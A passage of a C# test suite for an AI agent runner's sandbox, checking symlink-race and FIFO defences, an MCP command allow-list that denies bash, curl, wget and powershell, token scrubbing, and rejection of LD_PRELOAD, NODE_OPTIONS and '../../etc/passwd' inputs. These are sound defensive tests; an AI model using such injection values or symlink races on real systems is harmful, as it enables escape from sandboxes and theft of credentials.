        File.WriteAllText(Path.Combine(outsideDir, "data.txt"), "secret");
        var probe = Path.Combine(workDir, "symlink-probe");
        if (!SymlinkTestHelper.TryCreateDirectory(probe, outsideDir))
        {
            Directory.Delete(root, true);
            return;
        }
        Directory.Delete(probe);
        var replacementCreated = false;
        var replacementBlocked = false;

        try
        {
            var content = await SecureFileSystem.ReadAllTextAsync(
                workDir,
                Path.Combine(parent, "data.txt"),
                TestContext.CancellationToken,
                beforeLeafOpen: () =>
                {
                    try
                    {
                        Directory.Move(parent, movedParent);
                        Directory.CreateSymbolicLink(parent, outsideDir);
                        replacementCreated = true;
                    }
                    catch (IOException) when (Directory.Exists(parent))
                    {
                        replacementBlocked = true;
                    }
                    catch (UnauthorizedAccessException) when (Directory.Exists(parent))
                    {
                        replacementBlocked = true;
                    }
                });

            Assert.IsTrue(replacementCreated || replacementBlocked);
            Assert.AreEqual("safe", content);
        }
        finally
        {
            Directory.Delete(root, true);
        }
    }

    [TestMethod]
    public void SecureMetadataRejectsLeafSymlinkReplacement()
    {
        var root = Path.Combine(Path.GetTempPath(), $"session-fs-stat-race-{Guid.NewGuid():N}");
        var workDir = Path.Combine(root, "work");
        var outsideFile = Path.Combine(root, "secret.txt");
        var target = Path.Combine(workDir, "data.txt");
        Directory.CreateDirectory(workDir);
        File.WriteAllText(target, "safe");
        File.WriteAllText(outsideFile, "secret");
        var probe = Path.Combine(workDir, "symlink-probe");
        if (!SymlinkTestHelper.TryCreateFile(probe, outsideFile))
        {
            Directory.Delete(root, true);
            return;
        }
        File.Delete(probe);

        try
        {
            Assert.ThrowsExactly<UnauthorizedAccessException>(() =>
                SecureFileSystem.Exists(
                    workDir,
                    target,
                    beforeLeafOpen: () =>
                    {
                        File.Delete(target);
                        File.CreateSymbolicLink(target, outsideFile);
                    }));

            File.Delete(target);
            File.WriteAllText(target, "safe");
            Assert.ThrowsExactly<UnauthorizedAccessException>(() =>
                SecureFileSystem.GetStatus(
                    workDir,
                    target,
                    beforeLeafOpen: () =>
                    {
                        File.Delete(target);
                        File.CreateSymbolicLink(target, outsideFile);
                    }));
        }
        finally
        {
            Directory.Delete(root, true);
        }
    }

    [TestMethod]
    public void SecureMetadataRejectsFifoWithoutBlocking()
    {
        if (OperatingSystem.IsWindows())
            return;

        var root = Path.Combine(Path.GetTempPath(), $"session-fs-fifo-{Guid.NewGuid():N}");
        var workDir = Path.Combine(root, "work");
        var fifo = Path.Combine(workDir, "blocked");
        Directory.CreateDirectory(workDir);
        using var process = Process.Start(new ProcessStartInfo
        {
            FileName = "mkfifo",
            UseShellExecute = false,
            ArgumentList = { fifo },
        });
        process!.WaitForExit();
        Assert.AreEqual(0, process.ExitCode);

        try
        {
            var stopwatch = Stopwatch.StartNew();

            Assert.ThrowsExactly<UnauthorizedAccessException>(() =>
                SecureFileSystem.Exists(workDir, fifo));
            Assert.ThrowsExactly<UnauthorizedAccessException>(() =>
                SecureFileSystem.GetStatus(workDir, fifo));

            Assert.IsTrue(stopwatch.Elapsed < TimeSpan.FromSeconds(2));
        }
        finally
        {
            File.Delete(fifo);
            Directory.Delete(root, true);
        }
    }

    [TestMethod]
    public async Task SecureReadRejectsSymlinkRoot()
    {
        var root = Path.Combine(Path.GetTempPath(), $"session-fs-root-link-{Guid.NewGuid():N}");
        var outsideDir = Path.Combine(root, "outside");
        var linkedRoot = Path.Combine(root, "linked-root");
        Directory.CreateDirectory(outsideDir);
        File.WriteAllText(Path.Combine(outsideDir, "secret.txt"), "secret");
        if (!SymlinkTestHelper.TryCreateDirectory(linkedRoot, outsideDir))
        {
            Directory.Delete(root, true);
            return;
        }

        try
        {
            await Assert.ThrowsExactlyAsync<UnauthorizedAccessException>(() =>
                SecureFileSystem.ReadAllTextAsync(
                    linkedRoot,
                    Path.Combine(linkedRoot, "secret.txt"),
                    TestContext.CancellationToken));
        }
        finally
        {
            Directory.Delete(root, true);
        }
    }

    [TestMethod]
    public async Task SecureOperationsTreatNonDirectoryComponentAsNotFound()
    {
        var root = Path.Combine(Path.GetTempPath(), $"session-fs-not-dir-{Guid.NewGuid():N}");
        var workDir = Path.Combine(root, "work");
        var file = Path.Combine(workDir, "file");
        var child = Path.Combine(file, "child.txt");
        Directory.CreateDirectory(workDir);
        File.WriteAllText(file, "content");

        try
        {
            Assert.IsFalse(SecureFileSystem.Exists(workDir, child));
            await Assert.ThrowsExactlyAsync<FileNotFoundException>(() =>
                SecureFileSystem.ReadAllTextAsync(
                    workDir,
                    child,
                    TestContext.CancellationToken));
            Assert.ThrowsExactly<FileNotFoundException>(() =>
                SecureFileSystem.GetStatus(workDir, child));
        }
        finally
        {
            Directory.Delete(root, true);
        }
    }

    [TestMethod]
    public void SecureDirectoryCreateRejectsSymlinkCreatedAfterPathResolution()
    {
        var root = Path.Combine(Path.GetTempPath(), $"session-fs-mkdir-race-{Guid.NewGuid():N}");
        var workDir = Path.Combine(root, "work");
        var stateRoot = Path.Combine(root, "state");
        var outsideDir = Path.Combine(root, "outside");
        Directory.CreateDirectory(workDir);
        Directory.CreateDirectory(outsideDir);
        var link = Path.Combine(workDir, "linked");
        var handler = new LocalSessionFsHandler(stateRoot, workDir, [workDir]);
        var target = handler.ResolvePath(Path.Combine("linked", "escaped"));
        if (!SymlinkTestHelper.TryCreateDirectory(link, outsideDir))
        {
            Directory.Delete(root, true);
            return;
        }

        try
        {
            Assert.ThrowsExactly<UnauthorizedAccessException>(() =>
                SecureFileSystem.CreateDirectory(workDir, target));
            Assert.IsFalse(Directory.Exists(Path.Combine(outsideDir, "escaped")));
        }
        finally
        {
            Directory.Delete(root, true);
        }
    }
}

[TestClass]
public class IsAllowedMcpCommandTests
{
    [TestMethod]
    [DataRow("dotnet", true)]
    [DataRow("node", false)]
    [DataRow("npx", false)]
    [DataRow("python", false)]
    [DataRow("python3", false)]
    [DataRow("uvx", false)]
    [DataRow("bash", false)]
    [DataRow("sh", false)]
    [DataRow("curl", false)]
    [DataRow("wget", false)]
    [DataRow("cmd", false)]
    [DataRow("powershell", false)]
    public void ValidatesCommand(string command, bool expected)
    {
        Assert.AreEqual(expected, AgentRunner.IsAllowedMcpCommand(command));
    }

    [TestMethod]
    [DataRow("/usr/bin/dotnet", false)]
    [DataRow("/usr/local/bin/python3", false)]
    [DataRow("C:\\Program Files\\dotnet\\dotnet.exe", false)]
    [DataRow("/usr/bin/curl", false)]
    [DataRow("./dotnet", false)]
    [DataRow("../dotnet", false)]
    public void RejectsFullPaths(string command, bool expected)
    {
        Assert.AreEqual(expected, AgentRunner.IsAllowedMcpCommand(command));
    }

    [TestMethod]
    public void AllowsDotnetExeOnlyOnWindows()
    {
        Assert.AreEqual(
            OperatingSystem.IsWindows(),
            AgentRunner.IsAllowedMcpCommand("dotnet.exe"));
    }
}

[TestClass]
public class ScrubSensitiveEnvironmentTests
{
    [TestMethod]
    public void RemovesKnownSensitiveKeys()
    {
        var psi = new ProcessStartInfo();
        psi.Environment["GH_TOKEN"] = "gh_alias_secret";
        psi.Environment["GITHUB_TOKEN"] = "ghp_secret";
        psi.Environment["ACTIONS_RUNTIME_TOKEN"] = "token";
        psi.Environment["NPM_TOKEN"] = "npm_token";
        psi.Environment["NUGET_API_KEY"] = "nuget_key";
        psi.Environment["NUGET_PLUGIN_PATHS"] = "/tmp/plugin";
        psi.Environment["NUGET_NETCORE_PLUGIN_PATHS"] = "/tmp/netcore-plugin";
        psi.Environment["NUGET_PACKAGES"] = "/tmp/packages";
        psi.Environment["SAFE_VAR"] = "keep";

        AgentRunner.ScrubSensitiveEnvironment(psi);

        Assert.IsFalse(psi.Environment.ContainsKey("GH_TOKEN"));
        Assert.IsFalse(psi.Environment.ContainsKey("GITHUB_TOKEN"));
        Assert.IsFalse(psi.Environment.ContainsKey("ACTIONS_RUNTIME_TOKEN"));
        Assert.IsFalse(psi.Environment.ContainsKey("NPM_TOKEN"));
        Assert.IsFalse(psi.Environment.ContainsKey("NUGET_API_KEY"));
        Assert.IsFalse(psi.Environment.ContainsKey("NUGET_PLUGIN_PATHS"));
        Assert.IsFalse(psi.Environment.ContainsKey("NUGET_NETCORE_PLUGIN_PATHS"));
        Assert.IsFalse(psi.Environment.ContainsKey("NUGET_PACKAGES"));
        Assert.AreEqual("keep", psi.Environment["SAFE_VAR"]);
    }

    [TestMethod]
    public void RemovesCopilotPrefixedKeys()
    {
        var psi = new ProcessStartInfo();
        psi.Environment["COPILOT_SESSION_ID"] = "sess_123";
        psi.Environment["COPILOT_TOKEN"] = "token";
        psi.Environment["GH_AW_SECRET"] = "secret";
        psi.Environment["SAFE_VAR"] = "keep";

        AgentRunner.ScrubSensitiveEnvironment(psi);

        Assert.IsFalse(psi.Environment.ContainsKey("COPILOT_SESSION_ID"));
        Assert.IsFalse(psi.Environment.ContainsKey("COPILOT_TOKEN"));
        Assert.IsFalse(psi.Environment.ContainsKey("GH_AW_SECRET"));
        Assert.AreEqual("keep", psi.Environment["SAFE_VAR"]);
    }

    [TestMethod]
    public void PrefixMatchIsCaseInsensitive()
    {
        var psi = new ProcessStartInfo();
        psi.Environment["copilot_lower"] = "val";
        psi.Environment["Copilot_Mixed"] = "val";
        psi.Environment["gh_aw_lower"] = "val";

        AgentRunner.ScrubSensitiveEnvironment(psi);

        Assert.IsFalse(psi.Environment.ContainsKey("copilot_lower"));
        Assert.IsFalse(psi.Environment.ContainsKey("Copilot_Mixed"));
        Assert.IsFalse(psi.Environment.ContainsKey("gh_aw_lower"));
    }

    [TestMethod]
    public void DoesNotThrowWhenKeysAbsent()
    {
        var psi = new ProcessStartInfo();
        psi.Environment["PATH"] = "/usr/bin";

        // Should not throw even though sensitive keys are not present
        AgentRunner.ScrubSensitiveEnvironment(psi);

        Assert.IsTrue(psi.Environment.ContainsKey("PATH"));
    }
}

[TestClass]
public class CaptureGitHubTokenTests
{
    [TestMethod]
    public void PrefersGhTokenAndRemovesBothAliases()
    {
        var values = new Dictionary<string, string?>
        {
            ["GH_TOKEN"] = "gh-alias",
            ["GITHUB_TOKEN"] = "github-alias",
        };
        var removed = new List<string>();

        var token = AgentRunner.CaptureAndRemoveGitHubTokenAliases(
            key => values.GetValueOrDefault(key),
            removed.Add);

        Assert.AreEqual("gh-alias", token);
        Assert.AreSequenceEqual(["GH_TOKEN", "GITHUB_TOKEN"], removed);
    }

    [TestMethod]
    public void FallsBackToGitHubTokenAndStillRemovesBothAliases()
    {
        var values = new Dictionary<string, string?>
        {
            ["GITHUB_TOKEN"] = "github-alias",
        };
        var removed = new List<string>();

        var token = AgentRunner.CaptureAndRemoveGitHubTokenAliases(
            key => values.GetValueOrDefault(key),
            removed.Add);

        Assert.AreEqual("github-alias", token);
        Assert.AreSequenceEqual(["GH_TOKEN", "GITHUB_TOKEN"], removed);
    }
}

[TestClass]
public class SanitizeMcpEnvTests
{
    [TestMethod]
    public void ReturnsNullForNullInput()
    {
        Assert.IsNull(AgentRunner.SanitizeMcpEnv(null));
    }

    [TestMethod]
    public void ReturnsNullForEmptyInput()
    {
        Assert.IsNull(AgentRunner.SanitizeMcpEnv([]));
    }

    [TestMethod]
    public void StripsDangerousKeys()
    {
        var env = new Dictionary<string, string>
        {
            ["PATH"] = "/tmp/evil",
            ["LD_PRELOAD"] = "/tmp/evil.so",
            ["NODE_OPTIONS"] = "--require=evil",
            ["DOTNET_STARTUP_HOOKS"] = "/tmp/hook.dll",
            ["MY_SAFE_VAR"] = "hello",
        };

        var result = AgentRunner.SanitizeMcpEnv(env);

        Assert.IsNotNull(result);
        Assert.ContainsSingle(result);
        Assert.AreEqual("hello", result["MY_SAFE_VAR"]);
    }

    [TestMethod]
    public void ReturnsNullWhenAllKeysAreDangerous()
    {
        var env = new Dictionary<string, string>
        {
            ["PATH"] = "/evil",
            ["LD_PRELOAD"] = "/evil.so",
        };

        Assert.IsNull(AgentRunner.SanitizeMcpEnv(env));
    }

    [TestMethod]
    public void IsCaseInsensitive()
    {
        var env = new Dictionary<string, string>
        {
            ["path"] = "/tmp/evil",
            ["Node_Options"] = "--evil",
            ["safe_key"] = "ok",
        };

        var result = AgentRunner.SanitizeMcpEnv(env);

        Assert.IsNotNull(result);
        Assert.ContainsSingle(result);
        Assert.AreEqual("ok", result["safe_key"]);
    }
}

[TestClass]
public class SanitizeMcpArgsTests
{
    [TestMethod]
    public void AllowsShippedBinlogMcpArgs()
    {
        var result = AgentRunner.SanitizeMcpArgs(
            "dotnet",
            ["dnx", "Microsoft.AITools.BinlogMcp", "--yes", "--prerelease"]);

        Assert.IsNotNull(result);
        Assert.AreSequenceEqual(
            ["dnx", "Microsoft.AITools.BinlogMcp", "--yes", "--prerelease"],
            result);
    }

    [TestMethod]
    [DataRow("node", "server.js")]
    [DataRow("node", "/tmp/evil.js")]
    [DataRow("python", "server.py")]
    [DataRow("python3", "../server.py")]
    [DataRow("npx", "@modelcontextprotocol/server-filesystem")]
    [DataRow("uvx", "server")]
    public void RejectsUnsupportedRuntimeEntrypoints(string command, string argument)
    {
        Assert.IsNull(AgentRunner.SanitizeMcpArgs(command, [argument]));
    }

    [TestMethod]
    [DataRow("exec", "/tmp/evil.dll")]
    [DataRow("exec", "../evil.dll")]
    [DataRow("run", "--project")]
    [DataRow("dnx", "Other.Package")]
    [DataRow("dnx", "Microsoft.AITools.BinlogMcp@latest")]
    public void RejectsUnsupportedDotnetLaunchForms(string subcommand, string argument)
    {
        Assert.IsNull(AgentRunner.SanitizeMcpArgs("dotnet", [subcommand, argument]));
    }

    [TestMethod]
    public void RejectsModifiedBinlogMcpFlags()
    {
        Assert.IsNull(AgentRunner.SanitizeMcpArgs(
            "dotnet",
            ["dnx", "Microsoft.AITools.BinlogMcp", "--yes"]));
    }
}

[TestClass]
public class CheckPermissionTests
{
    // Use platform-appropriate paths for cross-platform test compatibility
    private static readonly string WorkDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "work"));
    private static readonly string SkillDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "skills", "test-skill"));

    [TestMethod]
    public void ApprovesPathsInsideWorkDir()
    {
        var filePath = Path.Combine(WorkDir, "file.txt");
        var result = AgentRunner.CheckPermission(filePath, WorkDir, null, log: null);
        Assert.IsTrue(result);
    }

    [TestMethod]
    public void ApprovesPathsInsideSkillPath()
    {
        var filePath = Path.Combine(SkillDir, "SKILL.md");
        var result = AgentRunner.CheckPermission(filePath, WorkDir, SkillDir, log: null);
        Assert.IsTrue(result);
    }

    [TestMethod]
    public void ApprovesPathsInsideAdditionalAllowedDirs()
    {
        var stagingDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "sv-iso-abc123", "my-skill"));
        var refPath = Path.Combine(stagingDir, "references", "guide.md");
        var result = AgentRunner.CheckPermission(refPath, WorkDir, null, log: null,
            additionalAllowedDirs: [stagingDir]);
        Assert.IsTrue(result);
    }

    [TestMethod]
    public void DeniesPathsOutsideAllowedDirectories()
    {
        var outsidePath = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "secret", "config"));
        var result = AgentRunner.CheckPermission(outsidePath, WorkDir, null, log: null);
        Assert.IsFalse(result);
    }

    [TestMethod]
    public void AllowsNullPath()
    {
        var result = AgentRunner.CheckPermission(null, WorkDir, null, log: null);
        Assert.IsTrue(result);
    }

    [TestMethod]
    public void DeniesPathsOutsideWorkDirWhenNoSkillPath()
    {
        var outsidePath = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "other"));
        var result = AgentRunner.CheckPermission(outsidePath, WorkDir, null, log: null);
        Assert.IsFalse(result);
    }

    [TestMethod]
    public void DeniesPathsWithSharedPrefixButDifferentDirectory()
    {
        var attackerPath = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "work-attacker", "evil.sh"));
        var result = AgentRunner.CheckPermission(attackerPath, WorkDir, null, log: null);
        Assert.IsFalse(result);
    }

    [TestMethod]
    public void AllowsEmptyStringPath()
    {
        var result = AgentRunner.CheckPermission("", WorkDir, null, log: null);
        Assert.IsTrue(result);
    }

    [TestMethod]
    public void ApprovesCommandPathInsideTempDir()
    {
        var cmdPath = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "bin", "tool"));
        var result = AgentRunner.CheckPermission(cmdPath, Path.GetTempPath().TrimEnd(Path.DirectorySeparatorChar), null, log: null);
        Assert.IsTrue(result);
    }
}

[TestClass]
public class ResolveSourcePathTests
{
    [TestMethod]
    public void ResolvesRelativeToEvalDirectory()
    {
        // Create a temp directory with a fixture file
        var tmpDir = Path.Combine(Path.GetTempPath(), $"sv-test-{Guid.NewGuid():N}");
        var fixturesDir = Path.Combine(tmpDir, "fixtures");
        Directory.CreateDirectory(fixturesDir);
        var fixtureFile = Path.Combine(fixturesDir, "test.txt");
        File.WriteAllText(fixtureFile, "test");
        try
        {
            var evalPath = Path.Combine(tmpDir, "eval.yaml");
            var result = AgentRunner.ResolveSourcePath("fixtures/test.txt", evalPath, skillPath: null);
            Assert.IsNotNull(result);
            Assert.AreEqual(Path.GetFullPath(fixtureFile), result);
        }
        finally
        {
            Directory.Delete(tmpDir, true);
        }
    }

    [TestMethod]
    public void FallsBackToSkillPathWhenEvalPathIsNull()
    {
        var tmpDir = Path.Combine(Path.GetTempPath(), $"sv-test-{Guid.NewGuid():N}");
        var fixturesDir = Path.Combine(tmpDir, "fixtures");
        Directory.CreateDirectory(fixturesDir);
        var fixtureFile = Path.Combine(fixturesDir, "data.cs");
        File.WriteAllText(fixtureFile, "// code");
        try
        {
            var result = AgentRunner.ResolveSourcePath("fixtures/data.cs", evalPath: null, skillPath: tmpDir);
            Assert.IsNotNull(result);
            Assert.AreEqual(Path.GetFullPath(fixtureFile), result);
        }
        finally
        {
            Directory.Delete(tmpDir, true);
        }
    }

    [TestMethod]
    public void ReturnsNullWhenBothPathsAreNull()
    {
        var result = AgentRunner.ResolveSourcePath("fixtures/test.txt", evalPath: null, skillPath: null);
        Assert.IsNull(result);
    }

    [TestMethod]
    public void RejectsPathTraversal()
    {
        var tmpDir = Path.Combine(Path.GetTempPath(), $"sv-test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(tmpDir);
        try
        {
            var evalPath = Path.Combine(tmpDir, "eval.yaml");
            var result = AgentRunner.ResolveSourcePath("../../etc/passwd", evalPath, skillPath: null);
            Assert.IsNull(result);
        }
        finally
        {
            Directory.Delete(tmpDir, true);
        }
    }

    [TestMethod]
    public void PrefersEvalPathOverSkillPath()
    {
        var evalDir = Path.Combine(Path.GetTempPath(), $"sv-eval-{Guid.NewGuid():N}");
        var skillDir = Path.Combine(Path.GetTempPath(), $"sv-skill-{Guid.NewGuid():N}");
        Directory.CreateDirectory(Path.Combine(evalDir, "fixtures"));
        Directory.CreateDirectory(Path.Combine(skillDir, "fixtures"));
        File.WriteAllText(Path.Combine(evalDir, "fixtures", "f.txt"), "eval");
        File.WriteAllText(Path.Combine(skillDir, "fixtures", "f.txt"), "skill");
        try
        {
            var evalPath = Path.Combine(evalDir, "eval.yaml");
            var result = AgentRunner.ResolveSourcePath("fixtures/f.txt", evalPath, skillPath: skillDir);
            Assert.IsNotNull(result);
            // Should resolve to eval directory, not skill directory
            Assert.StartsWith(Path.GetFullPath(evalDir), result);
        }
        finally
        {
            Directory.Delete(evalDir, true);
            Directory.Delete(skillDir, true);
        }
    }
}
